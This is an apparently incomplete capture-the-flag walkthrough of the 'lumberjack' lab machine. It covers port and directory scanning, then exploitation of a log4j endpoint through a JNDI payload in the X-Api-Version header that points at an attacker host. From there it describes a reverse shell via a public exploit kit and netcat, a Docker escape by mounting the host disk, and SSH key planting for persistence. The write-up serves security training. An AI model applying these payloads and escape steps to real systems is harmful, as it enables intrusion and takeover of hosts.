## RUSTSCAN:
`PORT   STATE SERVICE     REASON         VERSION
22/tcp open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6aa12d136c8f3a2de3ed84f4c7bf2032 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCnZPtl8mVLJYrSASHm7OakFUsWHrIN9hsDpkfVuJIrX9yTG0yhqxJI1i8dbI/MrexUGrIGzYbgLpYgKGsH4Q4dxB9bj507KQaTLWXwogdrkCVtP0WuGCo2EPZKorU85EWZAhrefG1Pzj3lAx1IdaxTHIS5zTqEJSZYttPF4BHb2avjKDVfSA+4cLP7ybq0rgohJ7JLG5+1dR/ijrGpaXnfudm/9BVjiKcGMlENS6bQ+a32Fs7wxL5c7RfKoR0CjA+pROXrOj5blQM4CI4wrEdphPZ/900I4DJ+kA6Ga+NJF6donQOmmhjsEEpI6RYcz6n/4ql1bomnyyI+jayyf3t
|   256 1dac5bd67c0c7b5bd4fee8fca16adf7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPkLzZd9EQTP/90Y/G1/CYr+PGrh376Qm6aZTO0HZ7lCZ0dExE834/QZ1vNyQPk4jg1KmS09Mzjz1UWWtUCYLg=
|   256 13ee5178417e3f543b9a249b06e2d514 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdrmxj3Q5Et6BwEm7pC8cz5louqLoEAwNXGHi+3ee+t
80/tcp open  nagios-nsca syn-ack ttl 62 Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=1/18%OT=22%CT=%CU=43858%PV=Y%DS=2%DC=T%G=N%TM=63C80FE6%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.533 days (since Wed Jan 18 03:39:46 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   42.55 ms 10.14.0.1
2   42.74 ms lumberjack (10.10.41.247)
`
* * *
## HTTP
Webdirectory search shows us some webdirectories:
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/lumberjack.thm]
└─# dirsearch -u 'http://lumberjack.thm/' -w /usr/share/seclists/Discovery/Web-Content/common.txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4713

Output File: /home/aleksandar/Downloads/lumberjack.thm/reports/http_lumberjack.thm/__23-01-18_16-25-29.txt

Target: http://lumberjack.thm/

[16:25:29] Starting:
[16:25:37] 500 -   73B  - /error
[16:26:19] 200 -   29B  - /~logs

Task Completed`

Checkin the website we can't find anything website says we need to dig deeper:
![55c06c14db6a2d3f8987277dba8eb6b9.png](../../../_resources/55c06c14db6a2d3f8987277dba8eb6b9.png)

Moving forward with recursive scanning we found something juicy:
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/lumberjack.thm]
└─# dirsearch -u 'http://lumberjack.thm/~logs' -w /usr/share/seclists/Discovery/Web-Content/common.txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4713

Output File: /home/aleksandar/Downloads/lumberjack.thm/reports/http_lumberjack.thm/_~logs_23-01-18_16-29-14.txt

Target: http://lumberjack.thm/

[16:29:14] Starting: ~logs/
[16:29:25] 200 -   47B  - /~logs/log4j

Task Completed
`

Now we see what is it all about, log4j vulnerability.. Opening the last webfolder in our browser and intercepting the traffic with Burp let's us test the exploit. Basically we just need to add ${jndi:ldap://attackers_IP:9001}in the header and check the response..
![49d1e5edda1878f024ad1d0f2c4291d3.png](../../../_resources/49d1e5edda1878f024ad1d0f2c4291d3.png)

We got a hint in the Header, basically run the log4j exploit but add it to X-Api-Version in the header instead.
![af8a17ce9ad9073052d0b117b441d524.png](../../../_resources/af8a17ce9ad9073052d0b117b441d524.png)

Doing what we got as tips we can shinn some traffic in our shell:
![10d54faef88c4721b0f25fb6bb80a58f.png](../../../_resources/10d54faef88c4721b0f25fb6bb80a58f.png)

Now we can try to exploit this log4j with this: https://github.com/KleekEthicalHacking/log4j-exploit
To do so we:
1. Download a jdk 8u20x64 tar.gz
2. Unpack it into same folder of clone repository
3. Set a NC listening on port 9001
4. Run the poc(it will setup a webserver to serve the malicious jar file, setup a malicious ldap server and lastly send the communication to our nc)
![a8f37ecdce49b6ab933dd8e695a7a116.png](../../../_resources/a8f37ecdce49b6ab933dd8e695a7a116.png)

Running the payload in Burp:
![a32099aa1b3d42f5b276217980e6d3be.png](../../../_resources/a32099aa1b3d42f5b276217980e6d3be.png)

Will get us a shell:
![283f077e041ef8f7ee1cb6af87c2337d.png](../../../_resources/283f077e041ef8f7ee1cb6af87c2337d.png)

* * *
## PRIVESC
At first login shows that we are root, but we know from machine ID tags that this should be a container and we want to escape so let's run linpeas to check what can we find more.
Searching for the flag.txt we find it in /opt

`bash-4.4# find / -type f -name *flag*
find / -type f -name *flag*
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/opt/.flag1`

Now we can read it it ls -al and subit our first flag.

From our linpeas enumeration we saw something interesting, root is part of disk group which meas we can do what we want with disks. 
![eb6047c1e19a953082fada07a92e251e.png](../../../_resources/eb6047c1e19a953082fada07a92e251e.png)

Listing all disks:
![26c8c1d686f805cf2b86557deb6f4794.png](../../../_resources/26c8c1d686f805cf2b86557deb6f4794.png)

We could mount  partiton xvda1 to tmp and escape the container by loading what docker see as storage from hosts itself:
![0703075a5f1768e94fba929102da3d84.png](../../../_resources/0703075a5f1768e94fba929102da3d84.png)

Checking in the mounted folder into root we got a rabbit hole:
![ee5745bc82ddf2f59ccf6d46c4c2c301.png](../../../_resources/ee5745bc82ddf2f59ccf6d46c4c2c301.png)

We can add our keys to authorized keys to get a better shell:
![54e8665c2dd1622661b5c7e0170024a9.png](../../../_resources/54e8665c2dd1622661b5c7e0170024a9.png)

Now we can see that this is the right ip since we got the IP from the same site aka we are in the host and we escaped the docker environment...
Now checking the tips to use -iname (basically it's the case insesitive search of the name of file for find command):
`find / -type f -iname *flag* 2>/dev/null`

We find a file:


* * *
